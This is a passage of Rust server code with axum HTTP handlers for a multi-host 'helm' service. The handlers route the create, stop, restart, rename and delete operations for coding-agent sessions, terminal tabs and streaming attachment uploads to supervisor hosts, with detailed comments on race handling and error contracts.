        (None, Some((host, status))) => Ok((host, status)),
        (Some(host), Some((live_host, _))) if host != live_host => Err(anyhow::Error::new(
            crate::store::HostStoreError::SessionOwnerAmbiguous {
                session: session_id.to_string(),
                first: host.min(live_host),
                second: host.max(live_host),
            },
        )),
        (Some(host), _) => {
            let status = state.manager.status(host).ok_or_else(|| {
                anyhow::Error::new(SupervisorError {
                    kind: ErrorKind::Conflict,
                    message: format!(
                        "session {session_id} lives on host {host}, which is no longer registered"
                    ),
                })
            })?;
            // RE-READ the cached owner after capturing the status, and
            // refuse if it moved. An adoption landing between the two reads
            // purges one host's cache and connects another, so the pair
            // taken naively can be "host A owns it" beside "host B's live
            // connection" — an operation sent to the wrong machine, with
            // nothing about either read looking wrong. Refusing is the only
            // safe answer available at this layer: the caller retries and
            // gets a coherent pair.
            let still = state.store.host_of_session(session_id).await?;
            if still != Some(host) {
                return Err(anyhow::Error::new(SupervisorError {
                    kind: ErrorKind::Conflict,
                    message: format!(
                        "session {session_id} changed hosts while this request was being routed; \
                         retry it"
                    ),
                }));
            }
            Ok((host, status))
        }
    }
}

/// The refusal sentence a non-connected host produces, for a session
/// operation and for a create alike.
///
/// Written once because SPEC.md requires the host's state to be IN the
/// error and requires errors to be actionable: two hand-written versions
/// would drift, and the one that drifted would be the one a user actually
/// read. The phase label is the same vocabulary the hosts list chips and
/// the log lines use ([`manager::HostState::phase`]), so a user comparing
/// an error against the hosts panel sees the same word in both.
fn refusal_text(host: crate::store::HostId, state: &manager::HostState) -> String {
    let detail = match state {
        manager::HostState::Connecting { last_error, .. } => last_error
            .clone()
            .unwrap_or_else(|| "the first connection attempt has not finished yet".to_string()),
        manager::HostState::Unreachable { last_error, .. } => last_error.clone(),
        manager::HostState::VersionSkew {
            peer_protocol,
            our_protocol,
            remediation,
            ..
        } => format!(
            "the host speaks protocol {peer_protocol} and this helm speaks {our_protocol}; \
             {remediation}"
        ),
        manager::HostState::IdentityMismatch { recorded, reported } => format!(
            "the host now reports identity {reported} where {recorded} was recorded; adopt the \
             new identity or fix the destination"
        ),
        manager::HostState::IdentityUnverified { recorded } => format!(
            "the host answered without an identity, so this helm cannot confirm it is still the \
             install recorded as {recorded}; fix the host so it reports its identity, or \
             retarget or remove this entry"
        ),
        manager::HostState::Duplicate { twin, .. } => {
            format!("this entry duplicates host {twin}; edit or remove it")
        }
        manager::HostState::Retired { reason } => reason.clone(),
        // Unreachable in practice — a connected host has a client and
        // never reaches this function — but stated rather than
        // `unreachable!()`: a panic on the refusal path would turn a
        // routing race into a dropped connection.
        manager::HostState::Connected { .. } => "the host connected while this was decided".into(),
    };
    format!(
        "host {host} is {phase}, so this operation is refused and nothing was queued: {detail}",
        phase = state.phase()
    )
}

#[derive(Deserialize)]
struct CreateReq {
    cwd: String,
    invocation: String,
    title: Option<String>,
    /// Which registered host to create on — a `HostView::id` from
    /// `GET /api/hosts` (PLAN_M6.md item 5).
    ///
    /// Optional, defaulting to the reserved LOCAL row. That is the tail of
    /// SPEC.md's own creation default ("the host of the currently open
    /// session, else the helm's own host"): the first half needs to know
    /// what the user is looking at and is therefore the client's to supply,
    /// while the fallback is a server-side fact the helm can state itself.
    /// Keeping it optional is also what leaves every hand-written caller —
    /// a curl, a script, a test — meaning the obvious thing on a
    /// single-machine setup.
    host: Option<crate::store::HostId>,
    #[serde(default = "default_cols")]
    cols: u16,
    #[serde(default = "default_rows")]
    rows: u16,
    /// The caller's idempotency key for this create (PLAN_M3.md item 6),
    /// passed straight through to the supervisor. Optional — like `title`,
    /// an absent field decodes as `None` — so every pre-M3 caller (curl, an
    /// older UI build, the CLI's startup create) keeps working unchanged,
    /// with each request its own create.
    intent_key: Option<String>,
    /// Override of the integrated-agent kind (PLAN_M3.md item 7), forwarded
    /// verbatim to `ControlMsg::CreateSession::agent_kind` — see that
    /// field's doc comment (farhelm-proto's `lib.rs`) for the full
    /// three-state semantics. Absent, like `intent_key`, decodes as `None`
    /// and preserves pre-M3 behavior: the supervisor derives the kind from
    /// `invocation`'s basename. On the wire a present value is one of the
    /// snake_case strings `"claude"`, `"codex"`, `"generic"` — the same
    /// representation `AgentKind`'s `#[serde(rename_all = "snake_case")]`
    /// produces on the supervisor protocol, so a JSON body needs no
    /// translation between the two.
    agent_kind: Option<farhelm_proto::AgentKind>,
    /// Override of the resume invocation template (PLAN_M3.md item 7),
    /// forwarded verbatim to `ControlMsg::CreateSession::resume_template` —
    /// see that field's doc comment for the placeholder-placement rule and
    /// the integrated/non-integrated distinction it enforces. Absent
    /// decodes as `None`, same posture as `intent_key`: for a session
    /// whose EFFECTIVE kind (after any `agent_kind` override) is
    /// integrated (claude/codex), the supervisor derives the template
    /// from `invocation`'s first token instead; a generic-kind session
    /// derives none — only this explicit override can give one a
    /// (verbatim, placeholder-free) resume invocation.
    resume_template: Option<Vec<String>>,
}

// Dimensions for a caller that has no terminal yet — the CLI, a script,
// a UI dialog that has not laid out a pane. 80x24 is a guess and it does
// not have to be a good one: the first attach resizes the window to the
// real client size, so these only decide how the agent's first few lines
// wrap before anyone is looking.
fn default_cols() -> u16 {
    80
}
fn default_rows() -> u16 {
    24
}

/// The connection to create on: the body's `host`, or the reserved local
/// row when the body named none (see [`CreateReq::host`]).
///
/// A create against a host in ANY non-connected state is a PRECONDITION
/// FAILURE, exactly as SPEC.md's creation section demands — a visible error
/// naming the host's state, and no session anywhere. It shares
/// [`refusal_text`] with the lifecycle routes on purpose: "unreachable
/// host" is listed in SPEC.md beside "nonexistent directory" as one of the
/// preconditions that fail a create, and the five other non-connected
/// states are the same failure with a different cause.
async fn create_target(
    state: &AppState,
    host: Option<crate::store::HostId>,
) -> anyhow::Result<(manager::SessionClaim, Arc<SupervisorClient>)> {
    let snapshots = state.manager.snapshots();
    let host =
        match host {
            Some(host) => host,
            None => snapshots
                .iter()
                .find(|snapshot| snapshot.kind == crate::store::HostKind::Local)
                .context(
                    "this helm has no local host row, so a create naming no host has no default \
                     target",
                )?
                .id,
        };
    let status = state.manager.status(host).ok_or_else(|| {
        anyhow::Error::new(SupervisorError {
            kind: ErrorKind::NotFound,
            message: format!("no such host: {host}"),
        })
    })?;
    // The claim is taken from the SAME read that produced the client, so
    // the seed that follows can prove it is still talking about this
    // connection — see `manager::SessionClaim`.
    let identity = match &status.state {
        manager::HostState::Connected { identity, .. } => identity.clone(),
        // Unreachable in practice: a client is published exactly while the
        // state is `Connected`, and the `ok_or_else` below is what turns
        // every other state into a refusal. Written as a value rather than
        // `unreachable!()` because a panic on the create path would be a
        // far worse answer than a seed that later declines itself.
        _ => None,
    };
    let claim = manager::SessionClaim {
        host,
        incarnation: status.incarnation,
        identity,
    };
    let client = status.client.ok_or_else(|| {
        anyhow::Error::new(SupervisorError {
            kind: ErrorKind::Conflict,
            message: refusal_text(host, &status.state),
        })
    })?;
    Ok((claim, client))
}

/// Record what a host just told us about one session, where the serving
/// path will find it.
///
/// Called by every mutation whose reply carries a fresh `SessionInfo`, and
/// each has its own reason:
///
/// - **Create.** Without this a create is followed by a window — up to one
///   refresh interval — in which every operation on the session it just
///   returned 404s, because routing resolves owners from what the helm has
///   recorded and the helm has recorded nothing yet. Not a theoretical gap:
///   the create dialog's own flow is "create, then open the terminal",
///   which lands in exactly that window.
/// - **Restart and rename.** The list is served from what the helm has
///   recorded, so a mutation whose result was not recorded leaves the row
///   showing the PREVIOUS state for a poll interval. A user who restarts an
///   exited session and watches the list keep saying `exited` has been shown
///   their own successful action as a failure (observed in the browser
///   suite, which is this behavior's regression test). Recording the reply
///   the host just sent costs nothing and closes it.
///
/// Goes through the MANAGER rather than straight to the store, and that is
/// not indirection for its own sake. The manager is what knows the two
/// things this write depends on: which storage a host uses (a host with no
/// identity caches nothing and serves from memory, and its created sessions
/// have to land there or they are invisible too), and whether the
/// connection the create used is still the current one. It is also what
/// serializes this write against the host's own refresh, so a drain that
/// predates the create cannot commit its wholesale replacement afterwards
/// and erase it.
///
/// BEST EFFORT for a stale claim, and deliberately not fatal: the session
/// exists and the caller must be told about it, since reporting a create
/// that actually succeeded as a failure is the one outcome SPEC.md's
/// creation contract rules out. Every such failure is self-healing within
/// one refresh — the host has the session and will report it.
///
/// AMBIGUITY IS THE EXCEPTION, and it is reported rather than swallowed:
/// if the session id is already cached under a DIFFERENT host there is no
/// honest owner, and routing would silently pick the other one. The
/// standing collision itself is not remembered HERE — it is refresh state
/// on the hosts that report it (`manager::ActorStatus::contested`), so it
/// clears itself when they stop.
async fn record_session(
    state: &AppState,
    claim: &manager::SessionClaim,
    session: &farhelm_proto::SessionInfo,
) {
    let Err(error) = state.manager.remember_session(claim, session).await else {
        return;
    };
    // The id is the PEER's text — escaped and bounded before it reaches a
    // log line, like every other peer-supplied value this process writes.
    let session_id = manager::peer_text(&session.id);
    if let Some(store::HostStoreError::SessionOwnerAmbiguous { first, second, .. }) = error
        .chain()
        .find_map(|cause| cause.downcast_ref::<store::HostStoreError>())
    {
        warn!(
            host = claim.host,
            session_id = session_id.as_str(),
            first,
            second,
            "the host reported a session id another host already claims; it will not be routed \
             while both keep claiming it"
        );
        return;
    }
    warn!(
        host = claim.host,
        session_id = session_id.as_str(),
        error = %error,
        "could not record the session for routing; it will be picked up at the next refresh"
    );
}

/// Forget a deleted session everywhere the serving path looks for it.
///
/// The delete's half of [`record_session`]'s principle, and the quadrant
/// that was missing: a reply with no `SessionInfo` still carries the fact
/// that a session is gone, and the merged list is served from what the helm
/// has recorded. Leaving the row behind means the list shows a deleted
/// session until the owning host's next refresh — and a client that deletes
/// and immediately re-creates then sees BOTH, which is indistinguishable
/// from a duplicate. That is precisely how the browser suite found it, in
/// its own shared-session reset.
///
/// Best effort on the same terms as a seed: the delete SUCCEEDED and the
/// caller must be told so. Everything here is self-healing within one
/// refresh.
async fn forget_session(state: &AppState, claim: &manager::SessionClaim, session_id: &str) {
    if let Err(error) = state.manager.forget_session(claim, session_id).await {
        warn!(
            host = claim.host,
            session_id = manager::peer_text(session_id).as_str(),
            error = %error,
            "could not forget the deleted session; it will disappear at the next refresh"
        );
    }
}

/// `POST /api/sessions` — the creation API SPEC_impl.md calls the one true
/// path. The UI's create dialog and any script land on the same supervisor
/// call this reaches; there is no side door, and as of PLAN_M6.md item 5
/// there is no argv path either.
///
/// The body's `host` selects which registered host to create on, defaulting
/// to the local row; a host that is not connected fails the create as a
/// precondition (see [`create_target`]).
///
/// A body carrying `intent_key` gets server-enforced idempotency
/// (PLAN_M3.md item 6): a retry of the same request under the same key
/// yields the same session rather than a second one, and a key reused for
/// a DIFFERENT request comes back 409 through `http_error`. A body carrying
/// `agent_kind` and/or `resume_template` (PLAN_M3.md item 7) reaches the
/// supervisor's create validation unchanged, including its refusal of an
/// integrated kind paired with a placeholder-free template — that refusal
/// surfaces as `ErrorKind::InvalidRequest` and comes back 400 through the
/// same `http_error` mapping every other create precondition failure uses.
///
/// The reply is the created `SessionInfo`, unchanged. It carries no host
/// fields (contrast the list's rows): the caller already knows which host
/// it asked for, and inventing a second place where a session's host is
/// reported would be a second thing to keep true.
///
/// The new session is seeded into its host's cache before this answers
/// ([`seed_created_session`]), so it is routable — stop, rename, terminal —
/// the moment the caller has its id, rather than after the owning host's
/// next refresh. It joins the LIST on that next refresh like any other
/// session; the two are separate promises and only the first one is
/// something a client can be surprised by.
async fn create_session(
    State(state): State<Arc<AppState>>,
    axum::Json(req): axum::Json<CreateReq>,
) -> impl IntoResponse {
    let (claim, client) = match create_target(&state, req.host).await {
        Ok(target) => target,
        Err(e) => return http_error(e),
    };
    match client
        .create_session_with_extras(
            &req.cwd,
            &req.invocation,
            req.title,
            req.cols,
            req.rows,
            CreateExtras {
                intent_key: req.intent_key,
                agent_kind: req.agent_kind,
                resume_template: req.resume_template,
            },
        )
        .await
    {
        Ok(session) => {
            record_session(&state, &claim, &session).await;
            axum::Json(session).into_response()
        }
        Err(e) => http_error(e),
    }
}

/// `POST /api/sessions/{id}/stop` — kill the agent's process tree, leaving
/// the session listed and its terminal viewable (SPEC.md's "stop", the
/// recoverable operation the UI does not confirm). The body carries no
/// information beyond success — an empty JSON object, so the response
/// shape stays uniform with `delete_session` below and callers do not
/// need to special-case "no content" bodies. An `id` the merged view does
/// not know is a 404 from [`route_session`] before any host is contacted,
/// and a session whose host is not connected is a 409 naming that state.
async fn stop_session(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
) -> impl IntoResponse {
    let (_claim, client) = match route_session(&state, &id).await {
        Ok(routed) => routed,
        Err(e) => return http_error(e),
    };
    match client.stop_session(&id).await {
        Ok(()) => axum::Json(serde_json::json!({})).into_response(),
        Err(e) => http_error(e),
    }
}

/// `GET /api/sessions/{id}` — one session's current state, as a merged-list
/// row (`SessionInfo` fields plus `host`, `host_name`, `stale`).
///
/// Exists for the recovery paths rather than for browsing: after a restart
/// (or after a restart whose reply was lost) a client needs THIS session's
/// current status and offer, and finding it must not depend on where it
/// happens to sit in its host's list.
///
/// ## Read, not operation — which is why it is not refused
///
/// This is the ONE `/api/sessions/{id}` route that a non-connected host
/// does not refuse, and the exception is SPEC.md's own: "opening such a
/// session shows its metadata — title, directory, last-known status —
/// behind a clear host-unreachable notice". Refusing here would leave the
/// UI nothing to put behind that notice. Every route that CHANGES
/// something still refuses (see [`route_session`]).
///
/// The two answers are deliberately different data, from one status read so
/// they cannot disagree:
///
/// - **Connected host: live, and the WHOLE list.** The owner's session list
///   is drained to exhaustion following its own cursor (the same bounded
///   walk the cache refresh uses), never one page. Asking for one page made
///   a session that happened to sit past the supervisor's default page
///   simply 404 — on a busy host, and only for the sessions a busy host has
///   most of. PLAN_M6.md is also explicit that the cache is for the stale
///   list and is not a general serving layer, so a reachable host's detail
///   must never come from it: a detail poll lagging the refresh cadence
///   would show a restart offer that no longer exists.
/// - **Non-connected host: last-known, `stale: true`.** The cached row,
///   which is exactly what the notice is drawn around.
///
/// ## Owner lookup does not depend on the cached row decoding
///
/// The owner is resolved from the cache's COLUMNS (and the manager's
/// in-memory lists), never from the stored metadata — so a row whose
/// `info_json` no longer decodes still routes, and a live session is served
/// from its host regardless of what its cached copy looks like. The
/// undecodable case only costs something for a host that is DOWN, where
/// there is genuinely nothing left to show and 404 is the honest answer.
///
/// Honest limitation, stated because it is not fixed here: the supervisor's
/// protocol has no per-session query, so the live path walks a list. What
/// this route buys is ONE place for every client's recovery lookup to live,
/// so the fix — a `GetSession` message — lands behind it rather than in each
/// caller.
async fn get_session(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
) -> impl IntoResponse {
    let (host, status) = match resolve_owner(&state, &id).await {
        Ok(owner) => owner,
        Err(e) => return http_error(e),
    };
    let Some(snapshot) = state
        .manager
        .snapshots()
        .into_iter()
        .find(|snapshot| snapshot.id == host)
    else {
        return http_error(anyhow::Error::new(SupervisorError {
            kind: ErrorKind::NotFound,
            message: format!("no such session: {id}"),
        }));
    };
    let host_name = aggregate::host_display_name(snapshot.kind, snapshot.destination.as_deref());

    // The client comes from the SAME status read that resolved the owner,
    // so "ask the host" and "say this row is live" cannot disagree.
    let Some(client) = status.client else {
        let cached = match state.store.cached_session(host, &id).await {
            Ok(cached) => cached,
            Err(e) => return http_error(e),
        };
        return match cached {
            Some(info) => axum::Json(aggregate::SessionRow {
                info,
                host,
                host_name,
                stale: true,
            })
            .into_response(),
            // The host is down and its cached copy is unreadable (or gone).
            // There is nothing to put behind the notice, and inventing a
            // placeholder would be worse than saying so.
            None => http_error(anyhow::Error::new(SupervisorError {
                kind: ErrorKind::NotFound,
                message: format!("no such session: {id}"),
            })),
        };
    };
    match manager::drain_sessions(&client).await {
        Ok(sessions) => match sessions.into_iter().find(|s| s.id == id) {
            Some(info) => axum::Json(aggregate::SessionRow {
                info,
                host,
                host_name,
                stale: false,
            })
            .into_response(),
            // The host is up and says this session is gone: it was deleted
            // between the last cache refresh and now, so 404 is the truth
            // rather than the stale row.
            None => http_error(anyhow::Error::new(SupervisorError {
                kind: ErrorKind::NotFound,
                message: format!("no such session: {id}"),
            })),
        },
        Err(e) => http_error(e),
    }
}

/// The body of `POST /api/sessions/{id}/restart`.
///
/// `mode` is required, and deliberately has no default: a restart that
/// guessed a mode could resume a conversation the caller never asked to
/// resume, or launch a fresh agent where the caller expected a resume.
/// The supervisor validates it against the session's CURRENT offer anyway
/// (PLAN_M3.md item 9), so a wrong value is refused rather than obeyed —
/// but an ABSENT one should not be silently turned into a choice at all.
///
/// `stop_if_running` defaults to false, the safe direction: an old-shaped
/// or hand-written body never kills a live agent by omission.
#[derive(Deserialize)]
struct RestartReq {
    mode: farhelm_proto::RestartMode,
    #[serde(default)]
    stop_if_running: bool,
}

/// `POST /api/sessions/{id}/restart` — relaunch the session's agent
/// (SPEC.md's restart; the resume offered when opening an interrupted
/// session is this same operation, not a separate one).
///
/// Pure passthrough, including of the refusals that carry this endpoint's
/// real contract: a `mode` that no longer matches the session's offer and
/// a live agent without `stop_if_running` both come back as 409s through
/// `http_error`, and a vanished working directory as a 400 naming the
/// directory. The success body is the session's freshly recomputed
/// `SessionInfo` — the same shape `POST /api/sessions` answers with — so a
/// caller can re-render the row (its new offer included) without listing
/// again. Routed by owner like every other lifecycle operation, so a
/// session on a non-connected host is refused with that host's state named
/// rather than reaching a supervisor at all.
async fn restart_session(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
    axum::Json(req): axum::Json<RestartReq>,
) -> impl IntoResponse {
    let (claim, client) = match route_session(&state, &id).await {
        Ok(routed) => routed,
        Err(e) => return http_error(e),
    };
    match client
        .restart_session(&id, req.mode, req.stop_if_running)
        .await
    {
        Ok(session) => {
            record_session(&state, &claim, &session).await;
            axum::Json(session).into_response()
        }
        Err(e) => http_error(e),
    }
}

/// The body of `POST /api/sessions/{id}/rename`: the verb-POST convention
/// `/stop` and `/restart` already use (PLAN_M5.md item 4), rather than a
/// PATCH with a partial `SessionInfo` — there is exactly one field to
/// change, and a verb route says so without inventing a partial-update
/// shape this API has nowhere else.
///
/// `title` has no default and no client-side shape check: an absent field
/// is a 422 from axum's `Json` extractor (a body that parses as JSON but
/// fails to deserialize into this struct — axum 0.8's
/// `JsonRejection::JsonDataError` status, distinct from the 400 a body
/// that is not even valid JSON gets) before this handler ever runs, and
/// every value that DOES parse — including control characters and the
/// empty string — is forwarded as-is (see `rename_session`'s docs for why
/// this handler does not pre-filter what only the supervisor is
/// authoritative over).
#[derive(Deserialize)]
struct RenameReq {
    title: String,
}

/// `POST /api/sessions/{id}/rename` — SPEC.md's rename verb (PLAN_M5.md
/// item 4), closing one of the two v1 client-surface operations
/// unimplemented since M1 (archive is the other, deliberately M7's).
///
/// Pure passthrough, deliberately: `req.title` reaches
/// `SupervisorClient::rename_session` VERBATIM, with no trimming and no
/// local validation. The supervisor is the sole authority on what title is
/// acceptable — control characters are refused, and a title over the 64
/// KiB field cap is refused, but every value that clears both (including
/// an explicit empty title) is accepted — so a helm-side check would only
/// be a second copy of that rule with its own chance to drift; a refused
/// title comes back through the same `ErrorKind`→status table every other
/// route uses (`InvalidRequest` 400, `NotFound` 404 for an unknown
/// session), and the accepted case answers with the session's freshly
/// recomputed `SessionInfo`, matching `get_session`'s and `restart_session`'s
/// success shape so a caller can re-render the row without listing again.
async fn rename_session(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
    axum::Json(req): axum::Json<RenameReq>,
) -> impl IntoResponse {
    let (claim, client) = match route_session(&state, &id).await {
        Ok(routed) => routed,
        Err(e) => return http_error(e),
    };
    match client.rename_session(&id, &req.title).await {
        Ok(session) => {
            record_session(&state, &claim, &session).await;
            axum::Json(session).into_response()
        }
        Err(e) => http_error(e),
    }
}

/// `DELETE /api/sessions/{id}` — remove a session and all its stored state
/// (SPEC.md's "delete"). This handler enforces nothing about liveness: it
/// deletes unconditionally, in any state. SPEC.md's confirm-when-alive
/// rule is normatively a CLIENT responsibility — no UI calls this route
/// yet, and when the UI PR adds the delete action, confirming before it
/// sends this request is that PR's job, not something to retrofit here.
/// Same empty-object success body as `stop_session`; an unknown `id` maps
/// to 404.
///
/// A successful delete FORGETS the session from the helm's own records
/// before it answers ([`forget_session`]), so the merged list stops showing
/// it at once rather than at the owning host's next refresh. Without that,
/// a delete followed immediately by a create shows both rows — which is
/// what the browser suite's own shared-session reset does on every test.
async fn delete_session(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
) -> impl IntoResponse {
    let (claim, client) = match route_session(&state, &id).await {
        Ok(routed) => routed,
        Err(e) => return http_error(e),
    };
    match client.delete_session(&id).await {
        Ok(()) => {
            forget_session(&state, &claim, &id).await;
            axum::Json(serde_json::json!({})).into_response()
        }
        Err(e) => http_error(e),
    }
}

/// `POST /api/sessions/{id}/tabs` — open a terminal tab: a plain shell in
/// the session's working directory (PLAN_M4.md item 2, plumbed through by
/// item 5). No request body: unlike `create_session`, a tab has nothing
/// for a caller to specify.
///
/// The success body is `{"tab": TabInfo}` rather than the bare object
/// `stop`/`delete` use, because there is something to hand back — the
/// minted tab id a client needs before it can attach
/// (`?tab=<id>` on `term_ws`). Every refusal the supervisor can give
/// (vanished working directory, no tmux session to open a window on, a
/// shell dead by reply time) reaches the browser through the same
/// `http_error` mapping every other endpoint uses, verbatim.
async fn open_tab(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
) -> impl IntoResponse {
    let (_claim, client) = match route_session(&state, &id).await {
        Ok(routed) => routed,
        Err(e) => return http_error(e),
    };
    match client.open_tab(&id).await {
        Ok(tab) => axum::Json(serde_json::json!({ "tab": tab })).into_response(),
        Err(e) => http_error(e),
    }
}

/// `DELETE /api/sessions/{id}/tabs/{tab_id}` — close a terminal tab: kill
/// its shell and everything it left behind, then drop the window
/// (PLAN_M4.md item 2). Same empty-object success body as `stop_session`/
/// `delete_session`; an unknown `tab_id` maps to 404 like any other
/// unknown identifier, and a tab whose shell had already exited still
/// closes successfully — `close_tab`'s own idempotency, passed straight
/// through.
async fn close_tab(
    State(state): State<Arc<AppState>>,
    AxPath((id, tab_id)): AxPath<(String, String)>,
) -> impl IntoResponse {
    let (_claim, client) = match route_session(&state, &id).await {
        Ok(routed) => routed,
        Err(e) => return http_error(e),
    };
    match client.close_tab(&id, &tab_id).await {
        Ok(()) => axum::Json(serde_json::json!({})).into_response(),
        Err(e) => http_error(e),
    }
}

/// Query parameters for `POST /api/sessions/{id}/attachments` — the
/// pinned attachment REST contract's `?filename=` proposal (PLAN_M4.md
/// item 5). `#[serde(default)]` is what makes an ABSENT query string and a
/// PRESENT-but-empty `?filename=` decode identically to `""`: both mean
/// "no name proposed", and `ControlMsg::BeginUpload`'s own docs say an
/// empty proposal is never a refusal, only ever sanitized away in favor of
/// a generated fallback name.
#[derive(Deserialize)]
struct UploadQuery {
    #[serde(default)]
    filename: String,
}

/// How long the browser→helm hop of an attachment upload may go without
/// the request body producing BYTES before the relay gives up on it.
///
/// This is the helm's own leg of PLAN_M4.md item 4's per-hop progress
/// timeout (the pinned REST contract's "per-hop progress timeout per
/// proto docs"), and it is genuinely a different bound from the
/// supervisor-facing credit stall `UploadGuard::send_upload_chunk`
/// applies: this one catches a browser that stops SENDING (a stalled
/// paste, a dead network path), which would otherwise park this handler —
/// and the supervisor's upload channel behind it — forever, with nothing
/// but the browser's own disconnect to ever notice.
///
/// Progress means BYTES, not events. A body stream is free to yield
/// empty chunks, and an endless supply of them is exactly the shape a
/// no-progress transfer takes; rearming on any yielded item would let a
/// client hold an upload open indefinitely while relaying nothing, so the
/// deadline is absolute and only a non-empty relayed chunk moves it.
///
/// Sixty seconds matches `WRITER_STALL_TIMEOUT` and
/// `UPLOAD_ACK_STALL_TIMEOUT` (`client.rs`), so every hop of one transfer
/// is declared stalled on the same generous, non-arbitrary timescale.
const CLIENT_UPLOAD_STALL_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(60);

/// Turn an upload-ending reason (a stall, an `UploadAborted`, or a dead
/// connection to the supervisor) into the mapped error response the
/// pinned REST contract promises: "500-class with the reason text",
/// because a receiver-side abort is a server-side fault the caller could
/// not have avoided by sending a different request — never a 4xx, which
/// would wrongly suggest the browser's request was itself the problem.
fn upload_ended_error(reason: String) -> axum::response::Response {
    http_error(anyhow::Error::new(SupervisorError {
        kind: ErrorKind::Internal,
        message: reason,
    }))
}

/// `POST /api/sessions/{id}/attachments?filename=<proposed name>` — the
/// helm's streaming relay for one attachment upload (PLAN_M4.md item 5;
/// see the pinned attachment REST contract for the wire-level shape this
/// implements). No direct client-to-supervisor path exists, so every byte
/// crosses this handler: `BeginUpload` (declaring the request's
/// `Content-Length` as the size), then the body forwarded chunk by chunk
/// via `SupervisorClient::send_upload_chunk` (rechunked at
/// `UPLOAD_CHUNK_BYTES`, paced by the credit window), then `CommitUpload`
/// once the body ends — mirroring `serve_term`'s "every exit path tells
/// the supervisor" discipline, but for a send-direction attachment
/// instead of a terminal.
///
/// STREAMS rather than buffers: `request.into_body().into_data_stream()`
/// is read one chunk at a time and each chunk is forwarded (and its
/// memory released) before the next is read, so a multi-gigabyte upload
/// costs this handler time, never a proportional amount of memory — the
/// same "no size cap in v1" promise PLAN_M4.md item 4 makes for the
/// supervisor's own half of this path.
///
/// "Every exit path" includes the one that runs no code here at all: a
/// browser resetting the connection cancels this future outright, so the
/// obligation to abort belongs to the `UploadGuard` that `begin_upload`
/// returns rather than to the branches below (see its docs). The branches
/// exist to report accurately, not to be the only thing standing between a
/// dead client and a supervisor holding a temp file forever.
///
/// The endings, and what each is answerable for:
/// - Body read error (a genuine client disconnect surfaces this way once
///   `Content-Length` framing is in play — the transport cannot honestly
///   deliver a short body any other way) or a stall past
///   [`CLIENT_UPLOAD_STALL_TIMEOUT`]: `AbortUpload` reaches the
///   supervisor and the failure is reported.
/// - A body LONGER than the declared `Content-Length`: refused here, as a
///   400, before the excess is forwarded. The supervisor cannot classify
///   this one — past `UploadStarted` it has no pending `req_id` to hang a
///   correlated `InvalidRequest` on, so an overrun would reach it as an
///   uncorrelated abort — and this hop is the only one holding both the
///   declaration and the byte count, so the mismatch is the helm's to
///   name. A SHORT body is the opposite case: the supervisor detects it
///   at commit and its own message passes through verbatim.
/// - `UploadAborted` mid-stream (the supervisor's own stall timeout, a
///   storage error, the session deleted mid-transfer): raced against the
///   body read, so it ends the request when it arrives rather than
///   whenever the browser next sends something, and the reason is mapped
///   through [`upload_ended_error`].
/// - The supervisor's own `Error` replies to `BeginUpload`/`CommitUpload`
///   (unknown session, size mismatch, storage failure) reach the browser
///   through the same `http_error` every other endpoint uses — the
///   supervisor's message verbatim, sentinel-testable.
/// - Success: `CommitUpload` answers with the published path, returned as
///   `{"path": "..."}` — `UploadCommitted::path` passed through verbatim.
async fn upload_attachment(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
    Query(q): Query<UploadQuery>,
    request: axum::extract::Request,
) -> axum::response::Response {
    use farhelm_proto::UPLOAD_CHUNK_BYTES;
    use futures_util::{FutureExt, StreamExt};

    // Declared size = Content-Length (the pinned contract's own words):
    // the browser sets this from the Blob it is uploading, so an absent
    // or unparsable value means this was never a conformant upload
    // request at all, and there is nothing to declare to `BeginUpload`.
    let Some(size) = request
        .headers()
        .get(axum::http::header::CONTENT_LENGTH)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.parse::<u64>().ok())
    else {
        return (
            axum::http::StatusCode::BAD_REQUEST,
            "attachment upload requires a valid Content-Length header\n".to_string(),
        )
            .into_response();
    };

    // Routed BEFORE the body is touched, like every other session
    // operation: an upload to a session on a non-connected host must be
    // refused with that host's state named, not half-relayed and then
    // abandoned.
    let (_claim, client) = match route_session(&state, &id).await {
        Ok(routed) => routed,
        Err(e) => return http_error(e),
    };
    let mut upload = match client.begin_upload(&id, &q.filename, size).await {
        Ok(upload) => upload,
        Err(e) => return http_error(e),
    };
    let channel = upload.channel();

    let mut body = request.into_body().into_data_stream();
    let mut sent: u64 = 0;
    // Bytes accepted from the body but not yet framed. Rechunking works
    // in both directions — a body chunk larger than
    // `UPLOAD_CHUNK_BYTES` is split, and several smaller ones are
    // coalesced — because the protocol's frame size is the SENDER's
    // decision, not an echo of however hyper happened to slice the
    // request. Without the coalescing half, a browser trickling 8 KiB
    // pieces would put tens of thousands of undersized frames on a
    // connection whose framing discipline exists to bound exactly that.
    let mut pending: Vec<u8> = Vec::new();
    // Absolute, not per-item: see `CLIENT_UPLOAD_STALL_TIMEOUT` for why
    // only non-empty body bytes may move it.
    let mut deadline = tokio::time::Instant::now() + CLIENT_UPLOAD_STALL_TIMEOUT;
    loop {
        // Coalescing must never become buffering: bytes are held back
        // only while more are already waiting. The moment the body has
        // nothing ready, whatever is pending goes out before this parks —
        // otherwise a slow producer's bytes would sit here unsent, and
        // the SUPERVISOR's own progress timeout would fire on a transfer
        // that was making perfectly good progress.
        //
        // `now_or_never` polls with a throwaway waker, so a readiness
        // notification arriving during that poll would be dropped — which
        // is harmless only because the `None` arm polls the same stream
        // again, with a real waker, a few lines later.
        let step = match body.next().now_or_never() {
            Some(next) => UploadStep::Body(next),
            None => {
                if !pending.is_empty() {
                    let flushed = std::mem::take(&mut pending);
                    if let Err(reason) = upload.send_upload_chunk(&flushed).await {
                        return upload_ended_error(reason);
                    }
                }
                // The select yields a value rather than acting inside its
                // arms: every arm borrows `upload` or `body`, and the
                // paths below need `&mut upload` back to abort.
                tokio::select! {
                    biased;
                    reason = upload.ended() => UploadStep::Ended(reason),
                    _ = tokio::time::sleep_until(deadline) => UploadStep::Stalled,
                    next = body.next() => UploadStep::Body(next),
                }
            }
        };
        let chunk = match step {
            // The transfer ended upstream — the supervisor gave up, or
            // the connection to it died. Nothing left to abort in either
            // case, and the reason is what the browser must see.
